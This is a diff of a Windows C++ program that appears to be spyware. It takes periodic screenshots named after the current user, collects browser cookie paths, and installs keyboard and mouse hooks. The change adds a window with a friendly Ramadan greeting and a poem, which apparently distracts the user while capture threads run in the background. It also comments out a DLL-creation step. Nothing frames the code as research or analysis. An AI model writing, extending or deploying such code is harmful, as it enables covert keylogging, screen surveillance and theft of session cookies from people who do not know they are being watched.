@@ -420,19 +420,38 @@ void GetScreenshot(const std::wstring& userName) {
     std::time_t now = std::time(nullptr);
     std::tm timeinfo;
     localtime_s(&timeinfo, &now);
-    wchar_t buffer[256]; // It can be get smaller
-    wcsftime(buffer, sizeof(buffer), L"%Y-%m-%d_%H-%M-%S", &timeinfo);
+
+    // Calculate required buffer size for formatted date and time string
+    size_t bufferSize = 20; // Initial buffer size
+    wchar_t* buffer = new wchar_t[bufferSize]; // Allocate memory for buffer
+
+    // Format date and time string, checking for buffer overflow
+    size_t resultSize = 0;
+    do {
+        resultSize = std::wcsftime(buffer, bufferSize, L"%Y-%m-%d_%H-%M-%S", &timeinfo);
+        if (resultSize == 0) {
+            // If buffer wasn't large enough, reallocate with double the size
+            bufferSize *= 2;
+            delete[] buffer;
+            buffer = new wchar_t[bufferSize];
+        }
+    } while (resultSize == 0);
+
     std::wstring filename = GetValidFileName(userName) + L"_" + std::wstring(buffer);
     std::wstring pngFilePath = filename + L".png";
 
     // Save Screenshot as PNG
     SaveScreenshotAsPNG(pngFilePath, hBitmap, w, h);
 
-    // clean up
+    // Clean up
     SelectObject(hDC, old_obj);
     DeleteDC(hDC);
     ReleaseDC(NULL, hScreen);
     DeleteObject(hBitmap);
+
+    // Free dynamically allocated memory
+    delete[] buffer;
+
 }
 
 bool DllPartOfFunctions() {
@@ -555,29 +574,128 @@ void CreateScreenshotFolder(const std::wstring& userName) {
     }
 }
 
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+    case WM_DESTROY:
+        PostQuitMessage(0);
+        return 0;
+    case WM_PAINT: {
+        PAINTSTRUCT ps;
+        HDC hdc = BeginPaint(hwnd, &ps);
+        RECT rect;
+        GetClientRect(hwnd, &rect);
 
-int main()
-{
+        // Draw the greeting message
+        DrawText(hdc, L"Hello, my dear programmer", -1, &rect, DT_CENTER | DT_SINGLELINE);
+
+        // Calculate the height of the greeting text
+        int textHeight = DrawText(hdc, L"Hello, my dear programmer", -1, &rect, DT_CENTER | DT_SINGLELINE);
+        rect.top += textHeight + 20; // Move down below the greeting text
+
+        // Set font size for the "Wishing you blessed Ramadan" message
+        HFONT hFont = CreateFont(30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, L"Arial");
+        HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
+
+        // Wishing you blessed Ramadan
+        std::wstring message = L"Wishing you a blessed Ramadan\r\n";
+        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);
+
+        // Restore the old font
+        SelectObject(hdc, hOldFont);
+        DeleteObject(hFont);
+
+
+        // Adjust rect for the next message
+        rect.top += textHeight + 40;
+
+        // A short poem about wars and technology
+        message = L"In the era of wars and technology";
+        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);
+
+        // Adjust rect for the next message
+        rect.top += textHeight + 5;
+
+        message = L"We wield bytes instead of blades,";
+        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);
+
+        // Adjust rect for the next message
+        rect.top += textHeight + 5;
+
+        message = L"Battlefields are lines of code";
+        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);
+
+        // Adjust rect for the next message
+        rect.top += textHeight + 5;
+
+        message = L"Where algorithms clash like spades.";
+        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);
+
+        EndPaint(hwnd, &ps);
+        return 0;
+    }
+    }
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+
+void CreateWindowAndMessageLoop() {
+    // Register window class
+    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WindowProc, 0, 0, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, L"WindowClass", NULL };
+    RegisterClassEx(&wc);
+
+    // Create window
+    HWND hwnd = CreateWindowEx(0, L"WindowClass", L"Message from ferivonus", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, NULL, NULL, wc.hInstance, NULL);
+
+    if (hwnd == NULL) {
+        MessageBox(NULL, L"Window creation failed!", L"Error", MB_ICONERROR);
+        return;
+    }
+
+    // Show and update window
+    ShowWindow(hwnd, SW_SHOWDEFAULT);
+    UpdateWindow(hwnd);
+
+    // Message loop
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+}
+
+
+void WaitForThreads(std::thread& thread1, std::thread& thread2) {
+    thread1.join();
+    thread2.join();
+}
+
+int main() {
+
     // Get the user's name
     wchar_t userName[MAX_PATH];
     DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
     if (!GetUserNameW(userName, &userNameSize)) {
         std::cerr << "Failed to retrieve user name." << std::endl;
         return 1;
-    
     }
 
     CreateScreenshotFolder(userName);
+    
+    // Create a thread for opening a win screen
+    std::thread windowThread(CreateWindowAndMessageLoop);
 
     // Create a thread for capturing Screenshots
     std::thread captureThread(ScreenCaptureThread, userName);
 
-    // Perform other tasks in the main thread
-    if (!DllPartOfFunctions()) {
-        std::cerr << "Failed when program created a DLL file.";
-        return 1;
-    }
+    /*
+    
+        if (!DllPartOfFunctions()) {
+            std::cerr << "Failed when program created a DLL file.";
+            return 1;
+        }
 
+    */
+    
     // Get the cookie paths
     std::vector<std::wstring> cookiePaths = GetCookiePaths();
 
@@ -607,11 +725,12 @@ int main()
     UnhookWindowsHookEx(keyboardHook);
     UnhookWindowsHookEx(mouseHook);
 
-    // Wait for the capture thread to finish (should not happen in this scenario)
-    captureThread.join();
+    // Wait for both threads to finish
+    WaitForThreads(captureThread, windowThread);
 
     return 0;
 }
+
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
